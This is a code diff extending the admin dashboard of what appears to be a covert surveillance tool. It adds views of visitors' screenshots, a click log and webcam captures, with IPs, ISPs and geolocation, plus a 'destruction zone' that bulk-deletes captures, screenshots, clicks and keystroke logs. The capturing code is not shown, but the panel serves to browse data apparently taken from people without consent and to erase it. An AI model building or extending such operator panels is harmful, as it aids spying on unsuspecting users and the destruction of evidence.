@@ -198,6 +198,10 @@ a:hover{text-decoration:underline}
     <div class="cap-strip" id="capStrip"></div>
   </div>
   <div class="col">
+    <div class="section-title"># screen captures <span id="screenCount" style="color:#ffc800"></span></div>
+    <div class="cap-strip" id="screenStrip"></div>
+  </div>
+  <div class="col">
     <div class="section-title"># locations <span id="locCount" style="color:#ffc800"></span></div>
     <div class="loc-box" id="locBox">Loading...</div>
   </div>
@@ -207,11 +211,30 @@ a:hover{text-decoration:underline}
   </div>
 </div>
 
+<div class="section-title" onclick="toggleSection('clicksSection')"># click log <span id="clickCount" style="color:#555"></span> [toggle]</div>
+<div id="clicksSection" style="display:none">
+  <div class="table-wrap">
+    <table><thead><tr>
+      <th>time</th><th>session</th><th>ip</th><th>element</th><th>text</th><th>x</th><th>y</th><th>page</th>
+    </tr></thead><tbody id="clicksBody"></tbody></table>
+  </div>
+</div>
+
 <div class="section-title"># unified feed <span id="feedCount" style="color:#555"></span></div>
 <div class="table-wrap">
   <table><thead><tr>
     <th>time</th><th>type</th><th>session</th><th>ip</th><th>country</th><th>city</th><th>isp</th><th>lat</th><th>lon</th><th>details</th>
   </tr></thead><tbody id="unifiedBody"></tbody></table>
+</div>
+
+<div class="section-title" style="margin-top:16px;color:#ff5252"># destruction zone</div>
+<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:10px">
+  <button onclick="deleteAll('all')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(255,50,50,0.1);border:1px solid rgba(255,50,50,0.2);color:#ff5252;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete ALL</button>
+  <button onclick="deleteAll('captures')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(100,150,255,0.08);border:1px solid rgba(100,150,255,0.12);color:#6496ff;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete captures</button>
+  <button onclick="deleteAll('screenshots')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.12);color:#ffc800;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete screenshots</button>
+  <button onclick="deleteAll('downloads')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(0,200,80,0.08);border:1px solid rgba(0,200,80,0.12);color:#00c853;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete downloads</button>
+  <button onclick="deleteAll('clicks')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(255,123,0,0.08);border:1px solid rgba(255,123,0,0.12);color:#ff7b00;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete clicks</button>
+  <button onclick="deleteAll('keystrokes')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(180,100,255,0.08);border:1px solid rgba(180,100,255,0.12);color:#b464ff;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete keystrokes</button>
 </div>
 
 <button class="refresh-btn" id="refreshBtn">[ refresh ]</button>
@@ -303,6 +326,8 @@ async function load() {
 
     const d = statsR;
     const caps = d.captures || [];
+    const screens = d.screenshots || [];
+    const clicks = d.clicks || [];
     const recent = d.recent || [];
     const dlLocs = locsR.downloads || [];
     const capLocs = locsR.captures || [];
@@ -312,9 +337,11 @@ async function load() {
     sessionCount.textContent = d.session_count || 0;
 
     statsGrid.innerHTML = `
-      <div class="card"><div class="val">${d.total+d.captures_total}</div><div class="lbl">events</div></div>
+      <div class="card"><div class="val">${d.total+d.captures_total+(d.screenshots_total||0)+(d.clicks_total||0)}</div><div class="lbl">events</div></div>
       <div class="card"><div class="val" style="color:#00c853">${d.success}</div><div class="lbl">downloads</div></div>
       <div class="card"><div class="val" style="color:#6496ff">${d.captures_total}</div><div class="lbl">captures</div></div>
+      <div class="card"><div class="val" style="color:#ffc800">${d.screenshots_total||0}</div><div class="lbl">screenshots</div></div>
+      <div class="card"><div class="val" style="color:#ff7b00">${d.clicks_total||0}</div><div class="lbl">clicks</div></div>
       <div class="card"><div class="val" style="color:#ffc800">${d.ip_count||0}</div><div class="lbl">IPs</div></div>
       <div class="card"><div class="val" style="color:#f857a6;font-size:1rem">${d.session_count||0}</div><div class="lbl">sessions</div></div>
       <div class="card"><div class="val" style="font-size:1rem;color:#888">${d.failed}</div><div class="lbl">failed</div></div>
@@ -360,6 +387,30 @@ async function load() {
       ? allLocs.map(r => `[${Number(r.lat).toFixed(3)}, ${Number(r.lon).toFixed(3)}] ${r.city||'?'}, ${r.country||'?'}${r.isp?' · '+r.isp:''}`).join('<br>')
       : 'no geo data yet';
 
+    document.getElementById('screenStrip').innerHTML = screens.map(s =>
+      `<div class="cap-item" title="${s.session_id?s.session_id.substring(0,12):'?'} · ${s.ip||'?'}">
+        <div class="del-btn" onclick="event.stopPropagation();deleteScreenshot(${s.id})">&#10005;</div>
+        <img src="/screenshots/${s.filename}" onclick="openPreview('/screenshots/${s.filename}','img')">
+        <div class="overlay">${s.ip||'?'}</div>
+      </div>`
+    ).join('') || '<div style="color:#444;font-size:0.6rem;padding:6px">no screenshots yet</div>';
+
+    screenCount.textContent = `(${screens.length})`;
+
+    clickCount.textContent = `(${clicks.length})`;
+    document.getElementById('clicksBody').innerHTML = clicks.slice(0,100).map(c =>
+      `<tr>
+        <td style="color:#555">${fmt(c.time)}</td>
+        <td style="color:#555;font-size:0.5rem">${c.session_id?c.session_id.substring(0,8):'-'}</td>
+        <td style="color:#888">${c.ip||'-'}</td>
+        <td>${c.tag||'-'}</td>
+        <td style="color:#666;max-width:120px;overflow:hidden;text-overflow:ellipsis">${c.text||'-'}</td>
+        <td style="color:#555">${c.x||'-'}</td>
+        <td style="color:#555">${c.y||'-'}</td>
+        <td style="color:#555;font-size:0.5rem">${c.page||'-'}</td>
+      </tr>`
+    ).join('') || '<tr><td colspan="8" style="text-align:center;color:#444;padding:12px">no clicks yet</td></tr>';
+
     document.getElementById('ipBox').innerHTML = (d.unique_ips||[]).slice(0,20).map(ip =>
       `<div style="padding:1px 4px;font-size:0.5rem;color:#777">${ip}</div>`
     ).join('') || '<div style="color:#444">no data</div>';
@@ -381,6 +432,7 @@ async function load() {
     const allItems = [];
     (recent || []).forEach(r => allItems.push({...r, _type:'download', _detail: `${r.title ? r.title.substring(0,40) : siteTag(r.url)} [${r.mode||''} ${r.status||''}]`}));
     caps.forEach(c => allItems.push({...c, _type:'capture', _detail:`${c.browser||'?'} ${c.os||'?'} ${c.device||'?'}`}));
+    screens.forEach(s => allItems.push({...s, _type:'screenshot', _detail:`${s.page||'?'} · ${s.ip||'?'}`}));
     allItems.sort((a,b) => (b.time||'').localeCompare(a.time||''));
 
     unifiedBody.innerHTML = allItems.slice(0,100).map(r => {
@@ -388,7 +440,9 @@ async function load() {
       const sess = r.session_id ? r.session_id.substring(0,8)+'...' : '-';
       const detail = r._type === 'capture'
         ? `<a href="javascript:openPreview('/captures/${r.filename}','img')" style="color:#6496ff">&#128247; view</a> ${r._detail}`
-        : r.filename
+        : r._type === 'screenshot'
+          ? `<a href="javascript:openPreview('/screenshots/${r.filename}','img')" style="color:#ffc800">&#128196; view</a> ${r._detail}`
+          : r.filename
           ? `<a href="/serve/${r.filename}" style="color:#00c853">&#8595;</a> <a href="javascript:openPreview('/preview/${r.filename}','video')" style="color:#6496ff">&#9654;</a> ${r._detail}`
           : r._detail;
       return `<tr>
@@ -419,6 +473,27 @@ async function deleteCapture(id) {
     const r = await fetch('/admin/captures/delete/' + id, { method:'POST' });
     const d = await r.json();
     if(d.success) load();
+    else alert('Delete failed: ' + (d.error || 'unknown'));
+  } catch(e) { alert('Delete error: ' + e.message); }
+}
+
+async function deleteScreenshot(id) {
+  if(!confirm('Delete this screenshot?')) return;
+  try {
+    const r = await fetch('/admin/screenshot/delete/' + id, { method:'POST' });
+    const d = await r.json();
+    if(d.success) load();
+    else alert('Delete failed: ' + (d.error || 'unknown'));
+  } catch(e) { alert('Delete error: ' + e.message); }
+}
+
+async function deleteAll(target) {
+  const labels = {all:'ALL files and records', captures:'all CAM captures', screenshots:'all SCREENSHOTS', downloads:'all DOWNLOADS', clicks:'all CLICK logs', keystrokes:'all KEYSTROKES'};
+  if(!confirm(`Delete ${labels[target]||target}? This cannot be undone.`)) return;
+  try {
+    const r = await fetch('/admin/delete-all', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target}) });
+    const d = await r.json();
+    if(d.success) { load(); alert('Deleted successfully.'); }
     else alert('Delete failed: ' + (d.error || 'unknown'));
   } catch(e) { alert('Delete error: ' + e.message); }
 }
